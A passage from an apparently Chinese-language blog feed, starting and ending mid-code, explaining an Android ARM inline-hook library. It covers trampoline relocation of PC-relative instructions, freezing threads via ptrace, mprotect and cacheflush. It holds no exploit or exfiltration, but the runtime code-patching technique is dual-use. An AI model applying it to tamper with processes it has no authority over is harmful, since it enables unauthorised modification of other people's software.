&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	value = pc + imm32;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = value;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如此便完成了B系列指令的修正，关于指令的字节结构请参考Arm指令手册。&lt;/p&gt;
&lt;h3 id=&quot;ADD-ARM指令的修正&quot;&gt;&lt;a href=&quot;#ADD-ARM指令的修正&quot; class=&quot;headerlink&quot; title=&quot;ADD_ARM指令的修正&quot;&gt;&lt;/a&gt;ADD_ARM指令的修正&lt;/h3&gt;&lt;p&gt;&lt;code&gt;ADD_ARM&lt;/code&gt;指的是&lt;code&gt;ADR Rd, &amp;lt;label&amp;gt;&lt;/code&gt;格式的指令，其中&lt;code&gt;&amp;lt;label&amp;gt;&lt;/code&gt;与PC相关。&lt;br&gt;首先通过循环遍历，得到Rd寄存器，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; rd;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; rm;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; r;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 解析指令得到rd、rm寄存器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rd = (instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0xF000&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;rm = instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0xF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 为避免冲突，排除rd、rm寄存器，选择一个临时寄存器Rr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (r = &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;; ; --r) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (r != rd &amp;amp;&amp;amp; r != rm) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;接下来是构造修正指令：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// PUSH &amp;#123;Rr&amp;#125;，保护Rr寄存器值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE52D0004&lt;/span&gt; | (r &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// LDR Rr, [PC, #8]，将PC值存入Rr寄存器中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE59F0008&lt;/span&gt; | (r &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 变换原指令`ADR Rd, &amp;lt;label&amp;gt;`为`ADR Rd, Rr, ?`&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = (instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFFF0FFFF&lt;/span&gt;) | (r &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//POP &amp;#123;Rr&amp;#125;，恢复Rr寄存器值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE49D0004&lt;/span&gt; | (r &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// ADD PC, PC，跳过下一条指令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE28FF000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = pc;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;ADR1-ARM、ADR2-ARM、LDR-ARM、MOV-ARM&quot;&gt;&lt;a href=&quot;#ADR1-ARM、ADR2-ARM、LDR-ARM、MOV-ARM&quot; class=&quot;headerlink&quot; title=&quot;ADR1_ARM、ADR2_ARM、LDR_ARM、MOV_ARM&quot;&gt;&lt;/a&gt;ADR1_ARM、ADR2_ARM、LDR_ARM、MOV_ARM&lt;/h3&gt;&lt;p&gt;分别为&lt;code&gt;ADR Rd, &amp;lt;label&amp;gt;&lt;/code&gt;、&lt;code&gt;ADR Rd, &amp;lt;label&amp;gt;&lt;/code&gt;、&lt;code&gt;LDR Rt, &amp;lt;label&amp;gt;&lt;/code&gt;、&lt;code&gt;MOV Rd, PC&lt;/code&gt;。&lt;br&gt;同样首先解析指令，得到&lt;code&gt;value&lt;/code&gt;，相关代码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; r;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; value;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;r = (instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0xF000&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == ADR1_ARM || type == ADR2_ARM || type == LDR_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; imm32;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	imm32 = instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0xFFF&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == ADR1_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		value = pc + imm32;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == ADR2_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		value = pc - imm32;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (type == LDR_ARM) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; is_add;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		is_add = (instruction &amp;amp; &lt;span class=&quot;number&quot;&gt;0x800000&lt;/span&gt;) &amp;gt;&amp;gt; &lt;span class=&quot;number&quot;&gt;23&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (is_add) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			value = ((&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) (pc + imm32))[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			value = ((&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) (pc - imm32))[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	value = pc;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;最后构造修正指令，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// LDR Rr, [PC]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE51F0000&lt;/span&gt; | (r &amp;lt;&amp;lt; &lt;span class=&quot;number&quot;&gt;12&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 跳过下一条指令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = &lt;span class=&quot;number&quot;&gt;0xE28FF000&lt;/span&gt;;	&lt;span class=&quot;comment&quot;&gt;// ADD PC, PC&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = value;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;h3 id=&quot;其他指令&quot;&gt;&lt;a href=&quot;#其他指令&quot; class=&quot;headerlink&quot; title=&quot;其他指令&quot;&gt;&lt;/a&gt;其他指令&lt;/h3&gt;&lt;p&gt;事实上，还有些指令格式需要修正，例如：&lt;code&gt;PUSH {PC}&lt;/code&gt;、&lt;code&gt;PUSH {SP}&lt;/code&gt;等，虽然这些指令被Arm指令手册标记为&lt;strong&gt;deprecated&lt;/strong&gt;，但是仍然为合法指令，不过在实际汇编中并未发现此类指令，故未做处理，相关代码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// 直接将指令存放到trampoline_instructions中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = instruction;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;处理完所有待处理指令后，最后加入返回指令：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;// LDR PC, [PC, #-4]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = 0xe51ff004;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;trampoline_instructions[trampoline_pos++] = lr;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Thumb指令的修正，大家可以参考这里的思路，自行阅读源码。&lt;/p&gt;
&lt;h2 id=&quot;线程处理&quot;&gt;&lt;a href=&quot;#线程处理&quot; class=&quot;headerlink&quot; title=&quot;线程处理&quot;&gt;&lt;/a&gt;线程处理&lt;/h2&gt;&lt;p&gt;一个完善的Inline Hook方案必须要考虑多线程环境，即要考虑线程恰好执行到被修改指令的位置。在Window下，使用&lt;code&gt;GetThreadContext&lt;/code&gt;和&lt;code&gt;SetThreadContext&lt;/code&gt;枚举所有线程，迁移context到搬迁后的指令中。然而在Linux+Arm环境下，并没有直接提供相同功能的API，不过可以使用&lt;code&gt;ptrace&lt;/code&gt;完成，主要流程如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;解析/proc/self/task目录，获取所有线程id&lt;/li&gt;
&lt;li&gt;创建子进程，父进程等待。子进程枚举所有线程，PTRACE_ATTACH线程，迁移线程PC寄存器，枚举完毕后，子进程给自己发SIGSTOP信号，等待父进程唤醒&lt;/li&gt;
&lt;li&gt;父进程检测到子进程已经SIGSTOP，完成Inline Hook工作，向子进程发送SIGCONT信号，同时等待子进程退出&lt;/li&gt;
&lt;li&gt;子进程枚举所有线程，PTRACE_DETACH线程，枚举完毕后，子进程退出&lt;/li&gt;
&lt;li&gt;父进程继续其他工作&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里使用子进程完成线程处理工作，实际上是迫不得已的。因为，如果直接使用本进程&lt;code&gt;PTRACE_ATTACH&lt;/code&gt;线程，会出现&lt;strong&gt;operation not permitted&lt;/strong&gt;，即使赋予root权限也是同样的错误，具体原因不得而知。&lt;br&gt;具体代码请参考&lt;code&gt;freeze&lt;/code&gt;与&lt;code&gt;unFreeze&lt;/code&gt;两个函数。&lt;/p&gt;
&lt;h2 id=&quot;其他一些细节&quot;&gt;&lt;a href=&quot;#其他一些细节&quot; class=&quot;headerlink&quot; title=&quot;其他一些细节&quot;&gt;&lt;/a&gt;其他一些细节&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;页保护&lt;br&gt;页面大小为4096字节，使用&lt;code&gt;mprotect&lt;/code&gt;函数修改页面属性，修改为&lt;code&gt;PROT_READ | PROT_WRITE | PROT_EXEC&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;刷新缓存&lt;br&gt;对于ARM处理器来说，缓存机制作用明显，内存中的指令已经改变，但是cache中的指令可能仍为原有指令，所以需要手动刷新cache中的内容。采用&lt;code&gt;cacheflush&lt;/code&gt;即可实现。&lt;/li&gt;
&lt;li&gt;一个已知的BUG&lt;br&gt;虽然本库已经把大部分工作放在了&lt;code&gt;registerInlineHook&lt;/code&gt;函数中，但是在&lt;code&gt;inlineHook&lt;/code&gt;、&lt;code&gt;inlineUnHook&lt;/code&gt;函数中还是不可避免的使用了部分libc库的API函数，例如：&lt;code&gt;mprotect&lt;/code&gt;、&lt;code&gt;memcpy&lt;/code&gt;、&lt;code&gt;munmap&lt;/code&gt;、&lt;code&gt;free&lt;/code&gt;、&lt;code&gt;cacheflush&lt;/code&gt;等。如果使用本库对上述API函数进行Hook，可能会失败甚至崩溃，这是因为此时原函数的指令已经被破坏，或者其逻辑已经改变。解决这个Bug有两个方案，第一是采用其他Hook技术；第二将本库中的这些API函数全部采用内部实现，即不依赖于libc库，可采用静态链接libc库，或者使用汇编直接调相应的系统调用号。&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文将结合&lt;a href=&quot;https://github.com/ele7enxxh/Android-Inline-Hook&quot;&gt;本项目&lt;/a&gt;的源代码，详细阐述Android Arm Inline Hook的原理与实现过程。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ARM平台backtrace与inlineHook多线程安全浅析</title>
    <link href="http://ele7enxxh.com/Analysis-Of-Backtrace-And-Inline-Hook-Thread-Safety-On-The-ARM-Platform.html"/>
    <id>http://ele7enxxh.com/Analysis-Of-Backtrace-And-Inline-Hook-Thread-Safety-On-The-ARM-Platform.html</id>
    <published>2015-11-27T06:02:00.000Z</published>
    <updated>2016-03-23T06:25:23.000Z</updated>
    
    <content type="html">&lt;p&gt;本文主要讨论了Android+ARM平台的backtrace原理以及inlineHook中涉及到的多线程安全的问题。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;本文关于Arm Inline Hook线程处理的解决方案已经过时，新方案点&lt;a href=&quot;http://ele7enxxh.com/Android-Arm-Inline-Hook.html&quot;&gt;这里&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在之前的Android inline hook项目中，在复杂环境下，如果遇到下面两个场景可能导致异常，甚至引起被hook进程的crash。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;待hook的函数正在执行；&lt;/li&gt;
&lt;li&gt;待hook的函数处于函数调用栈中；&lt;br&gt;举个例子，代码为：&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;meta-string&quot;&gt;&amp;lt;pthread.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 